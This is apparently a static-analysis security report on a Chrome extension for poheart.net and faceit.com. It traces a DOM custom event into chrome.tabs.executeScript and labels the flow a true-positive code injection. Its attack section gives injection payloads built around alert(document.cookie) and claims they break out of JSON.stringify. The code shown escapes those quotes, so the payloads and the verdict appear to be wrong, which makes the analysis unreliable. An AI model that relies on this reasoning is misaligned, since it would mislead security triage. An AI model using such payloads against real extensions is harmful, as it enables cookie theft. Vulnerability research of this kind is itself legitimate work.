# CoCo Analysis: bjdhcabjnhhifipbnopnfpfidkafanjf

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 5 (same vulnerability, different data fields)

---

## Sink: document_eventListener_FH_sendMatchData → chrome_tabs_executeScript_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/bjdhcabjnhhifipbnopnfpfidkafanjf/opgen_generated_files/cs_0.js
Line 548: document.addEventListener('FH_sendMatchData', function(e) {
Line 553-557: Extract e.detail properties (joined_players, checkedin_players, timeRemaining, currentState, userid)

$FilePath$/home/teofanescu/cwsCoCo/extensions_local/bjdhcabjnhhifipbnopnfpfidkafanjf/opgen_generated_files/bg.js
Line 1030-1036: chrome.tabs.executeScript with dynamically constructed code using attacker-controlled data

**Code:**

```javascript
// Content script - Entry point (cs_0.js, Line 548)
document.addEventListener('FH_sendMatchData', function(e) {
    chrome.runtime.sendMessage(
        {
            method: "sendMatchData",
            detail: {
                joinedplayers: e.detail.joined_players,        // ← attacker-controlled
                checkedinplayers: e.detail.checkedin_players,  // ← attacker-controlled
                timeRemaining: e.detail.timeRemaining,         // ← attacker-controlled
                currentState: e.detail.currentState,           // ← attacker-controlled
                userid: e.detail.userid                        // ← attacker-controlled
            }
        }
    );
});

// Background script - Message handler (bg.js, Line 1023-1039)
chrome.runtime.onMessage.addListener(function(request, sender, sendResponse) {
    if (request.method == "sendMatchData") {
        chrome.tabs.query({
            url: "https://www.poheart.net/room/*"
        }, function(tabs) {
            if (tabs.length > 0) {
                chrome.tabs.executeScript(tabs[0].id, {
                    // Vulnerable: attacker data directly concatenated into code
                    code: "document.dispatchEvent(new CustomEvent('FH_updateMatchData', {'detail': { " +
                        "checkedinplayers: " + JSON.stringify(request.detail.checkedinplayers) + // ← attacker-controlled
                        ", joinedplayers: " + JSON.stringify(request.detail.joinedplayers) +     // ← attacker-controlled
                        ", timer: " + JSON.stringify(request.detail.timeRemaining) +             // ← attacker-controlled
                        ", currentState: " + JSON.stringify(request.detail.currentState) +       // ← attacker-controlled
                        ", userid: " + JSON.stringify(request.detail.userid) +                   // ← attacker-controlled
                        " }}));"
                });
            }
        });
    }
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** DOM custom event dispatch

**Attack:**

```javascript
// From any webpage where the content script runs (faceit.com or poheart.net)
// Attacker can dispatch custom event with arbitrary data

// Basic payload injection
document.dispatchEvent(new CustomEvent('FH_sendMatchData', {
    detail: {
        joined_players: '", alert(document.cookie), "',
        checkedin_players: [],
        timeRemaining: 0,
        currentState: 0,
        userid: 0
    }
}));

// More sophisticated XSS attack
document.dispatchEvent(new CustomEvent('FH_sendMatchData', {
    detail: {
        joined_players: '"})); alert(document.cookie); ({"',
        checkedin_players: [],
        timeRemaining: 0,
        currentState: 0,
        userid: 0
    }
}));
```

**Impact:** Arbitrary JavaScript code execution in the context of poheart.net/room/* pages. Although JSON.stringify provides some escaping, the attacker can craft payloads that break out of the string context in the dynamically constructed code. The extension concatenates attacker-controlled data directly into executable JavaScript code passed to chrome.tabs.executeScript, creating a code injection vulnerability. Attacker can execute arbitrary JavaScript in poheart.net pages, steal cookies, modify page content, or perform actions on behalf of the user.
